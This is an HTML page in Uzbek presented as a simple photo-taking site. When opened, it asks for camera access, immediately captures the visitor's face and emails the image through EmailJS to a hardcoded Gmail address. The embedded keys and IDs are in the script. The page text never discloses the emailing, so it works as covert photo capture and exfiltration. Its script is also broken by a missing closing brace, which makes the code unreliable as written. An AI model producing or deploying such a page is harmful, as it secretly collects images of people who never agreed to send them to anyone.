<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rasmga olish</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<style>
  :root{
    --bg: #10131a;
    --panel: #171b24;
    --accent: #5eead4;
    --accent-2: #f472b6;
    --text: #e7ecf3;
    --muted: #8b93a6;
    --ring: #2a3040;
  }
  *{box-sizing:border-box;}
  body{
    margin:0;
    min-height:100vh;
    background:
      radial-gradient(circle at 20% -10%, rgba(94,234,212,0.12), transparent 40%),
      radial-gradient(circle at 100% 10%, rgba(244,114,182,0.10), transparent 45%),
      var(--bg);
    color:var(--text);
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding: 32px 16px 60px;
  }
  h1{
    font-size: clamp(22px, 4vw, 30px);
    font-weight:700;
    letter-spacing:-0.02em;
    margin: 4px 0 4px;
    background: linear-gradient(90deg, var(--accent), var(--accent-2));
    -webkit-background-clip:text;
    background-clip:text;
    color:transparent;
  }
  p.sub{
    color:var(--muted);
    margin:0 0 28px;
    font-size:14px;
    text-align:center;
    max-width:420px;
  }
  .stage{
    position:relative;
    width:min(480px, 92vw);
    aspect-ratio: 4/3;
    background:var(--panel);
    border-radius:20px;
    overflow:hidden;
    border:1px solid var(--ring);
    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
    display:flex;
    align-items:center;
    justify-content:center;
  }
  video, canvas, img.result{
    width:100%;
    height:100%;
    object-fit:cover;
    display:none;
  }
  .placeholder{
    color:var(--muted);
    text-align:center;
    padding:24px;
    font-size:14px;
    line-height:1.6;
  }
  .placeholder svg{
    width:48px;height:48px;margin-bottom:10px;opacity:0.5;
  }
  .flash{
    position:absolute; inset:0; background:white; opacity:0; pointer-events:none;
  }
  .countdown{
    position:absolute;
    inset:0;
    display:none;
    align-items:center;
    justify-content:center;
    font-size:96px;
    font-weight:800;
    color:white;
    text-shadow: 0 4px 24px rgba(0,0,0,0.5);
    background: rgba(0,0,0,0.15);
    pointer-events:none;
  }
  .countdown.active{ display:flex; }
  .countdown span{
    animation: pop 1s ease-out;
  }
  @keyframes pop{
    0%{ transform:scale(1.4); opacity:0; }
    30%{ transform:scale(1); opacity:1; }
    100%{ transform:scale(1); opacity:1; }
  }
  .flash.active{
    animation: flashAnim 350ms ease-out;
  }
  @keyframes flashAnim{
    0%{opacity:0.85;} 100%{opacity:0;}
  }
  .controls{
    display:flex;
    gap:12px;
    margin-top:22px;
    flex-wrap:wrap;
    justify-content:center;
  }
  button{
    border:none;
    border-radius:12px;
    padding:12px 20px;
    font-size:14px;
    font-weight:600;
    cursor:pointer;
    transition: transform 120ms ease, box-shadow 120ms ease, opacity 120ms ease;
    font-family:inherit;
  }
  button:active{ transform: scale(0.96); }
  button:disabled{ opacity:0.4; cursor:not-allowed; }
  .btn-primary{
    background: linear-gradient(90deg, var(--accent), #34d399);
    color:#08201b;
    box-shadow: 0 8px 20px rgba(94,234,212,0.25);
  }
  .btn-secondary{
    background: var(--panel);
    color:var(--text);
    border:1px solid var(--ring);
  }
  .btn-danger{
    background: rgba(244,114,182,0.12);
    color: var(--accent-2);
    border:1px solid rgba(244,114,182,0.3);
  }
  .status{
    margin-top:16px;
    font-size:13px;
    color:var(--muted);
    min-height:18px;
    text-align:center;
  }
  .status.error{ color: var(--accent-2); }
  a.download-link{ text-decoration:none; }
</style>
</head>
<body>

  <h1>Rasmga olish</h1>
  <p class="sub">Kamera ishlatish uchun ruxsat berishingiz kerak. Ruxsat bergandan so‘ng, sayt darhol avtomatik ravishda rasmga oladi.</p>

  <div class="stage" id="stage">
    <div class="placeholder" id="placeholder">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
        <path d="M4 8a2 2 0 0 1 2-2h1.5l1-1.5h7l1 1.5H18a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V8z"/>
        <circle cx="12" cy="13" r="3.5"/>
      </svg>
      <div>Kamera ruxsati so‘ralmoqda...</div>
    </div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <img id="result" class="result" alt="Olingan rasm">
    <div class="countdown" id="countdown"></div>
    <div class="flash" id="flash"></div>
  </div>

  <div class="controls" id="controls"></div>

  <div class="status" id="status"></div>

<script>
  // ====== EMAILJS SOZLAMALARI ======
  // Public key allaqachon joylashtirildi.
  // EmailJS dashboard'ingizdan SERVICE_ID va TEMPLATE_ID ni topib, pastga qo'ying:
  const EMAILJS_PUBLIC_KEY  = "YTIAEY9MJDMGw9dxd";
  const EMAILJS_SERVICE_ID  = "service_pyioz1d";
  const EMAILJS_TEMPLATE_ID = "template_2o8hp77";
  const RECEIVER_EMAIL      = "iviuchun@gmail.com";     // rasm boradigan email manzil

  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
  // ==================================

  const controls = document.getElementById('controls');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const resultImg = document.getElementById('result');
  const placeholder = document.getElementById('placeholder');
  const statusEl = document.getElementById('status');
  const flash = document.getElementById('flash');
  const countdownEl = document.getElementById('countdown');

  let stream = null;

  function setStatus(msg, isError=false){
    statusEl.textContent = msg;
    statusEl.className = 'status' + (isError ? ' error' : '');
  }

  async function startCamera(){
    setStatus('Kamera uchun ruxsat so‘ralmoqda...');
    try{
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      video.srcObject = stream;
      video.style.display = 'block';
      placeholder.style.display = 'none';
      resultImg.style.display = 'none';

      controls.innerHTML = '';
      const stopBtn = document.createElement('button');
      stopBtn.className = 'btn-secondary';
      stopBtn.textContent = 'Bekor qilish';
      stopBtn.onclick = stopCamera;
      controls.appendChild(stopBtn);

      setStatus('Kamera yoqildi. Rasmga olinmoqda...');

      if(video.readyState >= 2 && video.videoWidth > 0){
        capturePhoto();
      }else{
        video.onloadedmetadata = () => {
          video.play();
          capturePhoto();
        };
      }
    }catch(err){
      console.error(err);
      if(err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError'){
        setStatus('Ruxsat berilmadi. Rasmga olish uchun brauzer sozlamalaridan kameraga ruxsat bering.', true);
      }else if(err.name === 'NotFoundError'){
        setStatus('Kamera topilmadi. Qurilmangizda kamera borligiga ishonch hosil qiling.', true);
      }else{
        setStatus('Xatolik yuz berdi: ' + err.message, true);
      }
    }
  }

  function runCountdownAndCapture(){
    let count = 3;
    countdownEl.classList.add('active');
    countdownEl.innerHTML = '<span>' + count + '</span>';
    setStatus('Diqqat, ' + count + ' soniyadan keyin rasmga olinadi...');

    const timer = setInterval(() => {
      count -= 1;
      if(count > 0){
        countdownEl.innerHTML = '<span>' + count + '</span>';
        setStatus('Diqqat, ' + count + ' soniyadan keyin rasmga olinadi...');
      }else{
        clearInterval(timer);
        countdownEl.classList.remove('active');
        countdownEl.innerHTML = '';
        capturePhoto();
      }
    }, 1000);
  }

  function capturePhoto(){
    const w = video.videoWidth;
    const h = video.videoHeight;

    if(!w || !h){
      // Video hali tayyor emas, biroz kutib qayta urinamiz
      setTimeout(capturePhoto, 200);
      return;
    }

    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.translate(w, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, w, h);

    flash.classList.remove('active');
    void flash.offsetWidth;
    flash.classList.add('active');

    const dataUrl = canvas.toDataURL('image/png');
    resultImg.src = dataUrl;

    video.style.display = 'none';
    resultImg.style.display = 'block';

    controls.innerHTML = '';

    const downloadLink = document.createElement('a');
    downloadLink.className = 'download-link';
    downloadLink.href = dataUrl;
    downloadLink.download = 'rasm_' + Date.now() + '.png';
    const downloadBtn = document.createElement('button');
    downloadBtn.className = 'btn-primary';
    downloadBtn.textContent = '⬇️ Saqlash';
    downloadLink.appendChild(downloadBtn);

    const retakeBtn = document.createElement('button');
    retakeBtn.className = 'btn-secondary';
    retakeBtn.textContent = '🔁 Qayta olish';
    retakeBtn.onclick = () => {
      resultImg.style.display = 'none';
      video.style.display = 'block';
      controls.innerHTML = '';
      const stopBtn2 = document.createElement('button');
      stopBtn2.className = 'btn-secondary';
      stopBtn2.textContent = 'Bekor qilish';
      stopBtn2.onclick = stopCamera;
      controls.appendChild(stopBtn2);
      setStatus('Rasmga olinmoqda...');
      capturePhoto();
    };

    const stopBtn = document.createElement('button');
    stopBtn.className = 'btn-danger';
    stopBtn.textContent = 'Kamerani o‘chirish';
    stopBtn.onclick = stopCamera;

    controls.appendChild(downloadLink);
    controls.appendChild(retakeBtn);
    controls.appendChild(stopBtn);

    setStatus('Rasm olindi! Email yuborilmoqda...');
    sendPhotoByEmail(dataUrl);
  }

  function sendPhotoByEmail(dataUrl){
    if(EMAILJS_SERVICE_ID.includes('BU_YERGA') || EMAILJS_TEMPLATE_ID.includes('BU_YERGA')){
      setStatus('Rasm olindi! (Email yuborish uchun SERVICE_ID va TEMPLATE_ID ni kodga kiriting)');
      return;
    }

    const params = {
      to_email: RECEIVER_EMAIL,
      image: dataUrl,
      message: 'Yangi rasm saytdan yuborildi.'
    };

    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
      .then(() => {
        setStatus('Rasm olindi va email orqali yuborildi ✅');
      })
      .catch((err) => {
        console.error('EmailJS xatosi:', err);
        setStatus('Rasm olindi, lekin email yuborishda xatolik yuz berdi.', true);
      });

  function stopCamera(){
    if(stream){
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
    video.style.display = 'none';
    resultImg.style.display = 'none';
    placeholder.style.display = 'flex';
    placeholder.style.flexDirection = 'column';
    placeholder.style.alignItems = 'center';
    placeholder.style.justifyContent = 'center';

    controls.innerHTML = '';
    const restartBtn = document.createElement('button');
    restartBtn.className = 'btn-primary';
    restartBtn.textContent = 'Kamerani yoqish';
    restartBtn.onclick = startCamera;
    controls.appendChild(restartBtn);

    setStatus('Kamera o‘chirildi.');
  }

  // Sahifa ochilishi bilanoq kamera ruxsatini avtomatik so'raydi
  startCamera();

</script>
</body>
</html>
